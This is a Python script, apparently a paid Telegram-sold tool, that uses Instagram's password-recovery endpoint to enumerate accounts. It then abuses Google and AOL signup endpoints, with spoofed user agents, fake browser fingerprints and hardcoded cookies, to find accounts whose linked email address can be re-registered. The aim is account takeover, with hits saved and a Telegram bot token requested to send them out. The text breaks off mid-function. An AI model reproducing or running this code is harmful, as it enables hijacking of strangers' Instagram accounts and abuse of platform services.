#fully upgraded 
print('  HARD ENC BY - PRAVEEN ')
BYellow = '\x1b[1;33m'; R = '\x1b[1;34m'; BPurple = '\x1b[1;35m'; BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'; BLUE = '\033[94m'; RESET = '\033[0m'; BOLD = '\033[1m'
YELLOW = '\033[93m'; RED = '\033[91m'; GREEN = '\033[92m'; CYAN = '\033[96m'
MAGENTA = '\033[95m'
import sys
import time
from colorama import Fore
from time import sleep
def combo(s):
 for ASU in s + '\n':
  sys.stdout.write(ASU)
  sys.stdout.flush()
  sleep(1. / 1500)
n = '\033[1;35m'
j = '\033[1;36m'
o = '\033[1;31m'
x=j+f"""{RED}‚¢Ä‚£†‚£¥‚£ñ‚£∫‚£ø‚£ç‚†ô‚†õ‚†í‚†¶‚£§‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚°§‚†ñ‚†ö‚†ã‚†â‚£ø‚£ü‚£í‚£∂‚£§‚£Ä
‚†ô‚†â‚†â‚†â‚†â‚†ô‚†õ‚¢∂‚£∂‚°¶‚†Ä‚†Ä‚†â‚†≥‚£§‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°¥‚†õ‚†Å‚†Ä‚†Ä‚£∂‚£∂‚†û‚†õ‚†â‚†â‚†â‚†â‚†ô
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†õ‚¢ø‚£ü‚£Ä‚°Ä‚†à‚†≥‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°¥‚†ã‚†Ä‚¢Ä‚¢ê‚£ø‚†ü‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚¢ø‚°ü‚†Ä‚†Ä‚†ò‚¢∑‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∞‚†ü‚†Å‚†Ä‚†ò‚£ø‚†ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ª‚£ø‚†É‚†Ä‚†Ä‚¢ª‚£Ü‚†º‚£∑‚£§‚£á‚£±‚£∂‚£∏‚£ß‚£¥‚°¶‚¢î‚£∂‚†É‚†Ä‚†Ä‚¢ª‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚£ø‚†ø‚†â‚†õ‚£ø‚£∑‚£ø‚£ø‚£ø‚£ø‚£º‚£ø‚£ø‚£ø‚£∑‚£ø‚°ü‚†ã‚†π‚£ø‚°ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚£¶‚°∂‚†ü‚†õ‚†õ‚†ø‚†ø‚†ã‚†Ä‚†Ä‚†à‚†ª‚†ø‚†ü‚†ã‚†õ‚†∑‚£¶‚£û‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚†ü‚†õ‚¢ª‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£º‚†õ‚†õ‚†∑‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚†ü‚†Ä‚†Ä‚†Ä‚†à‚£∑‚†Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£§‚°Ä‚¢∞‚°è‚†Ä‚†Ä‚†Ä‚†à‚†≥‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚†û‚£Å‚£†‚£§‚£§‚°§‚†¥‚£ø‚†Ä‚¢∏‚£®‚£ø‚£ß‚£Ä‚£Ä‚£Ä‚£Ä‚£†‚£æ‚£ß‚£∏‚†Ä‚¢∏‚°∑‚†¶‚£§‚£§‚£§‚£Ñ‚°ò‚¢¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚°§‚£û‚£∑‚£æ‚£ø‚†ø‚†õ‚†Å‚†Ä‚†Ä‚£ø‚°Ä‚†Ä‚†õ‚†ø‚†ø‚†ã‚£â‚¢ã‚£â‚†ô‚†ø‚†ü‚†É‚†Ä‚£∏‚°á‚†Ä‚†Ä‚†ô‚†ª‚¢ø‚£ø‚£∂‚£ù‚£¶‚£Ñ‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†à‚†õ‚†õ‚†õ‚†ì‚†õ‚†õ‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚¢∑‚°Ä‚††‚£Ä‚†Ä‚†Ä‚†à‚°ü‚†Å‚†Ä‚¢Ä‚°†‚†Ä‚£∞‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†ô‚†õ‚†õ‚†õ‚†õ‚†õ‚†ã‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚¢¶‚°à‚¢≥‚°Ä‚†Ä‚†Å‚†Ä‚°∞‚†ã‚£∞‚†û‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£§‚£§‚£æ‚£ø‚°ñ‚†É‚†Ä‚†Ä‚†Ä‚†É‚£æ‚£ø‚£¶‚£§‚£Ñ‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ü‚†ì‚¢∂‚£¥‚†û‚†ö‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†§‚£Ä‚£†‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°õ‚†≤‚£∂‚£ø‚°∂‚†ö‚£π‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£¶‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ô‚†í‚†í‚†ã‚£π‚£ø‚†ü‚¢π‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£§‚£¨‚£•‚£§‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ô‚£ø‚£ø‚°â‚†ë‚†í‚†Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ë‚†Ç‚¢§‚£¥‚£è‚£æ‚£¥‚°ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†û‚†ô‚¢æ‚£ø‚£ø‚£ø‚£ª‚£ø‚£ø‚£ø‚£ß‚£º‚£è‚£∑‚£§‚†Ñ‚†Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†í‚†í‚†ö‚†â‚†Ä‚¢π‚¢ã‚°ø‚†â‚¢π‚¢ª‚°ü‚£ø‚£ø‚£Ø‚¢ø‚£Ü‚¢Ä‚£æ‚¢Ø‚£ø‚£ø‚°ü‚£ø‚¢ª‚°â‚†π‚£è‚¢ª‚†Å‚†Ä‚†ô‚†í‚†í‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚†ã‚†Å‚¢Ä‚°¥‚£ª‚£∏‚°ø‚†ø‚°è‚°á‚†à‚£ø‚£ø‚°è‚†à‚°õ‚°ø‚†ø‚£ø‚£ò‚°∑‚£Ñ‚°Ä‚†â‚¢≥‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ä‚†â‚†â‚†â‚†Å‚†ô‚¢Å‚†û‚†Ä‚†Ä‚°∑‚†Å‚£†‚†ã‚°ü‚¢£‚°Ä‚†±‚°á‚†Ä‚†à‚¢Ü‚†ô‚†Å‚†â‚†â‚†â‚†â‚†í‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°†‚†ñ‚†Å‚†Ä‚†Ä‚¢†‚°ø‚†ö‚†Å‚†Ä‚†Ä‚†Ä‚†ô‚†≤‚£§‚†Ä‚†Ä‚†Ä‚†ë‚†¢‚¢Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°ú‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ë‚†Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä

                                                   ùóóùóòùó© @cyberrXrich                                                                                                  """
combo(x)
import os
import sys
import re
import json
import time
import random
import string
import hashlib
import uuid
import requests
import threading
import webbrowser
from datetime import datetime
from threading import Thread, Lock
from random import choice, randrange
from user_agent import generate_user_agent
from cfonts import render, say
from colorama import Fore, Style, init
from bs4 import BeautifulSoup as sop
import requests
from datetime import datetime
import requests
from datetime import datetime

REMOTE_URL = "https://raw.githubusercontent.com/cyberr69/2/main/user.txt"

def fetch_id_data():
    try:
        response = requests.get(REMOTE_URL, timeout=3)
        response.raise_for_status()
        return [line.strip() for line in response.text.strip().splitlines() if "|" in line]
    except Exception as e:
        print(f"\033[1m[‚ùå] Error fetching data:\033[0m ")
        return []

def check_id_validity(input_id):
    input_id = input_id.strip()
    data = fetch_id_data()

    for record in data:
        try:
            id_val, expiry = map(str.strip, record.split("|"))
            if id_val == input_id:
                expiry_dt = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry_dt:
                    remaining = (expiry_dt - datetime.now()).seconds // 60
                    print(f"\033[1m\n[‚úÖ] Valid ID. Access expires in {remaining} minutes.\033[0m")
                    return True
                else:
                    print("\033[1m\n[‚õî] This ID has expired. Renew your subscription via @cyberrXrich\033[0m")
                    return False
        except Exception as err:
            print(f"\033[1m[‚ö†Ô∏è] Invalid record skipped:\033[0m {record} ‚Äî {err}")

    print("\033[1m\n[‚ö†Ô∏è] You are not a paid user. Buy a subscription ~ @cyberrXrich(TG)\033[0m")
    return False

input_id = input("ùó®ùó¶ùóòùó• ùóúùóó:")

if not check_id_validity(input_id):
    exit()

print("\033[1m\n[üöÄ] Access verified. Welcome!\033[0m")


# Initialize colorama
init(autoreset=True)

# Constants
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
AOL_SIGNUP_URL = 'https://login.aol.com/account/create'
TOKEN_FILE = 'token.txt'
GMAIL_DOMAIN = '@gmail.com'
AOL_DOMAIN = '@aol.com'

# Color Class
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    PINK = '\033[38;5;206m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;165m'
    MAGENTA = '\033[38;5;161m'
    LIME = '\033[38;5;154m'
    TEAL = '\033[38;5;51m'
    GOLD = '\033[38;5;220m'
    SILVER = '\033[38;5;248m'
    BWhite = '\x1b[1;37m'

# Emojis
EMOJI = {
    'hit': 'üéØ',
    'user': 'üë§',
    'email': 'üìß',
    'ig': 'üì∏',
    'stats': 'üìä',
    'error': '‚ö†Ô∏è',
    'success': '‚úÖ',
    'fail': '‚ùå',
    'loading': '‚è≥',
    'search': 'üîç',
    'lock': 'üîí',
    'unlock': 'üîì',
    'star': '‚≠ê',
    'fire': 'üî•',
    'rocket': 'üöÄ',
    'tool': 'üõ†Ô∏è',
    'time': '‚è∞',
    'bio': 'üìù',
    'link': 'üîó',
    'follower': 'üë•',
    'following': 'üíû',
    'post': 'üñºÔ∏è',
    'year': 'üìÖ'
}

# Stats Class
class Stats:
    def __init__(self):
        self.hits = 0
        self.bad_insta = 0
        self.bad_email = 0
        self.good_ig = 0
        self.ge = 0
        self.total_hits = 0
        self.lock = Lock()
        
    def update_display(self):
        with self.lock:
            sys.stdout.write(
                f'''
{Colors.MAGENTA}
‚ï≠‚îÅ‚ïÆ‚ï≠‚îÅ‚ïÆ‚ï≠‚îÅ‚îÅ‚îÅ‚ïÆ‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ‚ï≠‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÉ‚îÉ‚ï∞‚ïØ‚îÉ‚îÉ‚îÉ‚ï≠‚îÅ‚îÅ‚ïØ‚îÉ‚ï≠‚ïÆ‚ï≠‚ïÆ‚îÉ‚îÉ‚ï≠‚îÅ‚ïÆ‚îÉ
‚îÉ‚ï≠‚ïÆ‚ï≠‚ïÆ‚îÉ‚îÉ‚ï∞‚îÅ‚îÅ‚ïÆ‚ï∞‚ïØ‚îÉ‚îÉ‚ï∞‚ïØ‚îÉ‚îÉ‚ï±‚îÉ‚îÉ
‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚ï≠‚îÅ‚îÅ‚ïØ‚ï±‚ï±‚îÉ‚îÉ‚ï±‚ï±‚îÉ‚ï∞‚îÅ‚ïØ‚îÉ
‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚ï∞‚îÅ‚îÅ‚ïÆ‚ï±‚ï±‚îÉ‚îÉ‚ï±‚ï±‚îÉ‚ï≠‚îÅ‚ïÆ‚îÉ
‚ï∞‚ïØ‚ï∞‚ïØ‚ï∞‚ïØ‚ï∞‚îÅ‚îÅ‚îÅ‚ïØ‚ï±‚ï±‚ï∞‚ïØ‚ï±‚ï±‚ï∞‚ïØ‚ï±‚ï∞‚ïØ

{Colors.PINK}___________________________________
[ 1 ] {Colors.SILVER}ùêìùê´ùêÆùêû   : [ {self.hits} ] 
[ 2 ] {Colors.BLUE}ùêÖùêöùê•ùê¨ùêû  : [ {self.bad_insta} ] 
[ 3 ] {Colors.MAGENTA}ùêÅùêöùêù    : [ {self.bad_email} ] 
[ 4 ] {Colors.SILVER}ùêÜùê®ùê®ùêù   : [ {self.good_ig} ]
[ 5 ] ùêÉùêûùêØ ~ @cyberrXrich
{Colors.SILVER}___________________________________{Colors.END}'''
            )
            sys.stdout.flush()

stats = Stats()
infoinsta = {}


# User Input
def get_user_input():
    try:
        ID = input(f' {Colors.PINK}üîë {EMOJI["user"]} TELEGRAM CHAT ID: {Colors.CYAN}')
        print(f"{Colors.GOLD}‚ñ©"*60 + Colors.END)
        TOKEN = input(f' {Colors.PINK}ü§ñ {EMOJI["lock"]} TELEGRAM BOT TOKEN: {Colors.CYAN}')
        print(f"{Colors.GOLD}‚ñ©"*60 + Colors.END)
        MIN_FOLLOWERS = int(input(f' {Colors.PINK}üë• {EMOJI["follower"]} MINIMUM FOLLOWERS: {Colors.CYAN}'))
        print(f"{Colors.GOLD}‚ñ©"*60 + Colors.END)
        THREAD_COUNT = int(input(f' {Colors.PINK}‚ö° {EMOJI["rocket"]} THREAD COUNT [MAX 500]: {Colors.CYAN}'))
        print(f"{Colors.RED}‚ñ©"*60 + Colors.END)
        return ID, TOKEN, MIN_FOLLOWERS, THREAD_COUNT
    except ValueError:
        print(f"{Colors.RED}{EMOJI['error']} Please enter valid numbers!{Colors.END}")
        sys.exit(1)

# Generate Google Token
def generate_token():
    try:
        alphabet = 'abcdefghijklmnopqrstuvwxyz'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': generate_user_agent()
        }
        
        response = requests.get(
            f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB",
            headers=headers
        )
        
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            response.text
        ).group(2)
        
        cookies = {'__Host-GAPS': host}
        headers2 = {
            'authority': GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_ACCOUNTS_URL,
            'referer': 'https://accounts.google.com/signup/v2/createaccount',
            'user-agent': generate_user_agent()
        }
        
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
            cookies=cookies, headers=headers2, data=data
        )
        
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
            
    except Exception as e:
        print(f"{Colors.RED}{EMOJI['error']} Error generating token: {e}{Colors.END}")
        generate_token()

# Check Gmail
def check_gmail(email):
    try:
        if '@' in email:
            email = email.split('@')[0]
            
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
            
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        
        headers = {
            'authority': GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_ACCOUNTS_URL,
            'referer': f"https://accounts.google.com/signup/v2/createusername?TL={tl}",
            'user-agent': generate_user_agent()
        }
        
        params = {'TL': tl}
        data = (
            f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
            f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
            "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
            "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
            "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
            "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        )
        
        response = requests.post(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
            params=params, cookies=cookies, headers=headers, data=data,
            timeout=15
        )
        
        if '"gf.uar",1' in response.text:
            with stats.lock:
                stats.hits += 1
                stats.ge += 1
            stats.update_display()
            full_email = email + GMAIL_DOMAIN
            username, domain = full_email.split('@')
            save_account(username, domain)
        else:
            with stats.lock:
                stats.bad_email += 1
            stats.update_display()
            
    except Exception:
        pass

# Check AOL
def check_aol(email):
    global stats
    try:
        if '@' in email:
            name = email.split('@')[0]
        else:
            name = email
            
        # Get AOL session data
        qq = requests.get(AOL_SIGNUP_URL, headers={'User-Agent': generate_user_agent()})
        cookies = qq.cookies.get_dict()
        tm1 = str(time.time()).split('.')[0]
        
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f"ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA",
            '__gpi': f"UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ",
            'cmp': f"t={tm1}&j=0&u=1---"
        })
        
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        
        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f"https://login.aol.com/account/create?specId={specId}",
            'user-agent': generate_user_agent(),
            'x-requested-with': 'XMLHttpRequest'
        }
        
        data = {
            'validateField': 'userId',
            'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":4,"timezoneOffset":-60,"timezone":"Africa/Casablanca","sessionStorage":1,"localStorage":1,"indexedDb":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":5,"hash":"2c14024bf8584c3f7f63f24ea490e812"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 4000 (0x00000166) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":33,"hash":"edeefd360161b4bf944ac045e41d0b21"},"audio":"124.04347527516074","resolution":{"w":"1600","h":"900"},"availableResolution":{"w":"860","h":"1600"},"ts":{"serve":1704793094844,"render":1704793096534}}',
            'specId': specId,
            'cacheStored': '',
            'crumb': crumb,
            'acrumb': acrumb,
            'sessionIndex': sessionIndex,
            'done': 'https://www.aol.com',
            'attrSetIndex': '0',
            'specData': specData,
            'userId': name
        }
        
        res = requests.post(
            'https://login.aol.com/account/module/create',
            headers=headers,
            cookies=cookies,
            data=data
        ).text
        
        if '{"errors":[]}' in res:
            with stats.lock:
                stats.hits += 1
            stats.update_display()
            full_email = name + AOL_DOMAIN
            username, domain = full_email.split('@')
            save_account(username, domain)
        else:
            with stats.lock:
                stats.bad_email += 1
            stats.update_display()
    except Exception as e:
        print(f"{Colors.RED}{EMOJI['error']} AOL Error: {e}{Colors.END}")
        pass

# Check Instagram
def check_instagram(email):
    ua = generate_user_agent()
    device_id = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    
    headers = {
        'user-agent': ua,
        'cookie': 'mid=Z_DNugALAAHjd_D0kGV211hc0N92; csrftoken=j9tlfHSTJzODzkWw44JgHdhE4Fa3C8OQ',
        'content-type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        SIGNED_BODY: (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': 'j9tlfHSTJzODzkWw44JgHdhE4Fa3C8OQ',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        IG_SIG_KEY_VERSION: '4'
    }
    
    try:
        response = requests.post(
            INSTAGRAM_RECOVERY_URL, 
            headers=headers, 
            data=data,
            timeout=15
        ).text
        
        if email in response:
            if GMAIL_DOMAIN in email:
                check_gmail(email)
            elif AOL_DOMAIN in email:
                check_aol(email)
            with stats.lock:
                stats.good_ig += 1
            stats.update_display()
        else:
            with stats.lock:
                stats.bad_insta += 1
            stats.update_display()
    except Exception:
        with stats.lock:
            stats.bad_insta += 1
        stats.update_display()

# Get Reset Info
def get_reset_info(user):
    try:
        headers = {
            'user-agent': 'Instagram 100.0.0.17.129 Android',
            'cookie': 'mid=Z_DNugALAAHjd_D0kGV211hc0N92; csrftoken=j9tlfHSTJzODzkWw44JgHdhE4Fa3C8OQ',
            'content-type': 'application/x-www-form-urlencoded'
        }
        
        data = {
            SIGNED_BODY: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                '"device_id":"android-b93ddb37e983481c",'
                '"query":"' + user + '"}'
            ),
            IG_SIG_KEY_VERSION: '4'
        }
        
        response = requests.post(
            INSTAGRAM_RECOVERY_URL, 
            headers=headers, 
            data=data,
